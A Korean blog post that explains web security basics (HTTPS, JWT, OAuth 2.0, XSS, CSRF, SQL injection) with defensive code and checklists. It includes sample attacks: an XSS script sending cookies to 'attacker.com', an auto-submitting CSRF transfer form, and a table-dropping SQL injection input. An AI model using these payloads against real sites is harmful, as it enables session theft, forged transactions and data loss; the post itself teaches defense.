---
layout: post
title: 🔐 웹 보안 기초 완벽 가이드 (HTTPS, JWT, OAuth, XSS, CSRF)
date: 2025-11-07
categories:
  [
    "SamBeak",
    "Security",
    "HTTPS",
    "JWT",
    "OAuth",
    "XSS",
    "CSRF",
  ]
---

# 웹 보안이란 무엇인가

<br>
인터넷에서 정보를 주고받을 때, <br>
누군가 몰래 가로채거나 위조할 수 있다면? <br><br>

웹 보안은 이런 위험으로부터 <br>
사용자와 시스템을 지키는 방법이다. <br><br>

마치 은행에서 현금을 운반할 때 <br>
경호원과 보안차량을 사용하듯이, <br>
웹에서도 데이터를 안전하게 전송하고 <br>
사용자를 인증하는 방법이 필요하다. <br><br>

> ## 왜 웹 보안을 배워야 할까?

<br>

**이유 1: 개인정보 보호** <br>
비밀번호, 카드번호 등 민감한 정보를 지킨다. <br><br>

**이유 2: 법적 의무** <br>
개인정보보호법, GDPR 등 법적 준수 필요. <br><br>

**이유 3: 신뢰 구축** <br>
보안 사고는 기업의 신뢰를 무너뜨린다. <br><br>

**이유 4: 면접 필수** <br>
HTTPS, JWT, XSS 방어는 면접 단골 질문이다. <br><br>

# 기본 개념 요약

<br>

## 🏷️ HTTPS와 SSL/TLS

<br>

### HTTP vs HTTPS

<br>

**HTTP**: 암호화되지 않은 평문 통신 <br><br>

**우편엽서 비유**: 누구나 내용을 볼 수 있다. <br><br>

**HTTPS**: SSL/TLS로 암호화된 안전한 통신 <br><br>

**봉인된 편지 비유**: 받는 사람만 열어볼 수 있다. <br><br>

### HTTPS 동작 원리

<br>

```
1. 클라이언트 → 서버: "안녕하세요" (Client Hello)
2. 서버 → 클라이언트: "인증서입니다" (Server Hello)
3. 클라이언트: 인증서 검증 (CA 확인)
4. 클라이언트 → 서버: 암호화 키 교환
5. 양쪽: 대칭키로 암호화 통신 시작
```

<br>

**핵심 개념**:
- **CA (Certificate Authority)**: 인증서 발급 기관
- **공개키/개인키**: 비대칭 암호화
- **대칭키**: 실제 데이터 암호화

<br>

## 🏷️ JWT (JSON Web Token)

<br>

### JWT 구조

<br>

```
[Header].[Payload].[Signature]

eyJhbGci... .eyJ1c2Vy... .Xm3i8xW9J...
```

<br>

**Header**: 토큰 타입과 알고리즘

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

<br>

**Payload**: 실제 데이터

```json
{
  "userId": 123,
  "name": "홍길동",
  "role": "USER",
  "exp": 1700003599
}
```

<br>

**주의**: Payload는 암호화되지 않음! <br>
민감한 정보는 절대 넣지 말 것. <br><br>

**Signature**: 무결성 검증

```
HMACSHA256(
  base64(header) + "." + base64(payload),
  secret_key
)
```

<br>

### JWT 장단점

<br>

**장점**:
- Stateless (서버에 상태 저장 불필요)
- 확장성 (여러 서버에서 검증 가능)
- 마이크로서비스 적합

<br>

**단점**:
- 토큰 크기가 큼
- 즉시 무효화 어려움
- Payload 노출 위험

<br>

## 🏷️ OAuth 2.0

<br>

### OAuth란?

<br>

**개념**: 제3자 애플리케이션에 권한 위임 <br><br>

**호텔 비유**: <br>
마스터키 대신 임시 카드키 발급 <br>
사용 후 자동 무효화 <br><br>

### Authorization Code Flow

<br>

```
1. 사용자 → 클라이언트: "구글로 로그인"
2. 클라이언트 → 구글: 인증 요청 (리다이렉트)
3. 사용자 → 구글: 로그인 및 권한 승인
4. 구글 → 클라이언트: Authorization Code 전달
5. 클라이언트 → 구글: Code로 Access Token 요청
6. 구글 → 클라이언트: Access Token 발급
7. 클라이언트 → 구글 API: Token으로 사용자 정보 요청
```

<br>

# 주요 보안 위협

<br>

## 🏷️ XSS (Cross-Site Scripting)

<br>

### 공격 원리

<br>

**개념**: 악성 스크립트를 웹 페이지에 삽입 <br><br>

```html
<!-- 악성 코드 예시 -->
<script>
  fetch('http://attacker.com?cookie=' + document.cookie);
</script>
```

<br>

### XSS 방어

<br>

**1. 입력 이스케이프**:

```javascript
// ❌ 위험
element.innerHTML = userInput;

// ✅ 안전
element.textContent = userInput;

function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, m => map[m]);
}
```

<br>

**2. CSP 헤더**:

```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

<br>

**3. HttpOnly Cookie**:

```http
Set-Cookie: sessionId=abc; HttpOnly; Secure; SameSite=Strict
```

<br>

## 🏷️ CSRF (Cross-Site Request Forgery)

<br>

### 공격 원리

<br>

**개념**: 사용자가 의도하지 않은 요청을 강제 실행 <br><br>

```html
<!-- 악성 사이트 -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="1000000" />
</form>
<script>document.forms[0].submit();</script>
```

<br>

### CSRF 방어

<br>

**1. CSRF Token**:

```html
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="random123" />
  <input name="to" />
  <input name="amount" />
  <button>송금</button>
</form>
```

<br>

**2. SameSite Cookie**:

```http
Set-Cookie: sessionId=abc; SameSite=Strict
```

<br>

## 🏷️ SQL Injection

<br>

### 공격 원리

<br>

```java
// ❌ 위험
String query = "SELECT * FROM users WHERE username = '" + username + "'";

// 입력: admin'; DROP TABLE users; --
// 결과: 테이블 삭제!
```

<br>

### SQL Injection 방어

<br>

**Prepared Statement**:

```java
// ✅ 안전
String query = "SELECT * FROM users WHERE username = ?";
PreparedStatement pstmt = conn.prepareStatement(query);
pstmt.setString(1, username);
```

<br>

# 실전 예시

<br>

## 🏷️ Spring Security + JWT 구현

<br>

```java
@Component
public class JwtTokenProvider {
    
    @Value("${jwt.secret}")
    private String secretKey;
    
    public String createToken(String username, List<String> roles) {
        Claims claims = Jwts.claims().setSubject(username);
        claims.put("roles", roles);
        
        Date now = new Date();
        Date validity = new Date(now.getTime() + 3600000); // 1시간
        
        return Jwts.builder()
            .setClaims(claims)
            .setIssuedAt(now)
            .setExpiration(validity)
            .signWith(SignatureAlgorithm.HS256, secretKey)
            .compact();
    }
    
    public boolean validateToken(String token) {
        try {
            Jwts.parser().setSigningKey(secretKey).parseClaimsJws(token);
            return true;
        } catch (JwtException e) {
            return false;
        }
    }
    
    public String getUsername(String token) {
        return Jwts.parser()
            .setSigningKey(secretKey)
            .parseClaimsJws(token)
            .getBody()
            .getSubject();
    }
}
```

<br>

## 🏷️ OAuth 2.0 구현 (Google)

<br>

```yaml
# application.yml
spring:
  security:
    oauth2:
      client:
        registration:
          google:
            client-id: YOUR_CLIENT_ID
            client-secret: YOUR_CLIENT_SECRET
            scope: email, profile
```

<br>

```java
@Configuration
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .authorizeRequests()
                .antMatchers("/", "/login**").permitAll()
                .anyRequest().authenticated()
            .and()
            .oauth2Login();
        
        return http.build();
    }
}
```

<br>

# 실전 체크리스트

<br>

## ✅ HTTPS

<br>

- [ ] 모든 페이지에 HTTPS 적용
- [ ] HTTP → HTTPS 리다이렉트
- [ ] HSTS 헤더 설정
- [ ] SSL 인증서 자동 갱신

<br>

## ✅ 인증/인가

<br>

- [ ] 비밀번호 해싱 (BCrypt)
- [ ] JWT 만료 시간 설정
- [ ] Refresh Token 구현
- [ ] 역할 기반 접근 제어

<br>

## ✅ XSS 방어

<br>

- [ ] 입력 이스케이프
- [ ] CSP 헤더 설정
- [ ] HttpOnly Cookie
- [ ] 서버 측 검증

<br>

## ✅ CSRF 방어

<br>

- [ ] CSRF 토큰 사용
- [ ] SameSite Cookie
- [ ] Referer 검증

<br>

## ✅ SQL Injection 방어

<br>

- [ ] Prepared Statement
- [ ] ORM 사용
- [ ] 입력 검증
- [ ] 최소 권한 원칙

<br>

# 요약

<br>
웹 보안은 사용자와 시스템을 지키는 필수 요소다. <br><br>

**💎 핵심 포인트**:

1. **HTTPS**: 모든 통신을 암호화
2. **JWT**: Stateless 인증
3. **OAuth**: 제3자 인증 위임
4. **XSS 방어**: 입력 이스케이프, CSP
5. **CSRF 방어**: CSRF 토큰, SameSite
6. **SQL Injection**: Prepared Statement

<br>

**🔒 보안 원칙**:

- **최소 권한**: 필요한 권한만 부여
- **다층 방어**: 여러 보안 계층 적용
- **입력 검증**: 모든 입력을 의심
- **암호화**: 민감한 데이터는 암호화
- **로깅**: 보안 이벤트 기록

<br>

**📌 면접 단골 질문**:

- HTTPS 동작 원리
- JWT vs Session 차이
- XSS와 CSRF 차이 및 방어
- SQL Injection 방어 방법
- OAuth 2.0 플로우

<br>

웹 보안은 한 번 설정하고 끝이 아니라, <br>
지속적으로 관리하고 업데이트해야 한다. <br>
보안 사고는 기업의 신뢰와 직결되므로, <br>
처음부터 보안을 고려한 설계가 중요하다. <br><br>
